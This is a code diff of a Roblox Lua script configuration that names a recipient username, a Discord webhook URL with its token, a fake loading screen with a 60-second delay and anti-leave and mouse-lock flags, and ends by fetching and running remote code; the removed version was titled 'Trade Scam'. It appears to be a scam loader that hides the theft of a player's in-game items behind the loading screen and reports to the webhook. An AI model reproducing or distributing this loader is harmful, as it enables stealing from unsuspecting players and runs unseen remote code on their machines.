@@ -1,11 +1,14 @@
-Username = "Eneez416"
-WebHook = "https://discord.com/api/webhooks/1102620015548698634/dacbXgr1lBrYFbtW3ALkTYAMcxwhYf5ZSY1OZHUVGJ9Qpsk8-bnqYmLH3u_2LQhAX6Ea"
+UserName = "Eneez416"
+Webhook = "https://discord.com/api/webhooks/1102620015548698634/dacbXgr1lBrYFbtW3ALkTYAMcxwhYf5ZSY1OZHUVGJ9Qpsk8-bnqYmLH3u_2LQhAX6Ea"
 
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
 
-loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "Trade Scam"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 60 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
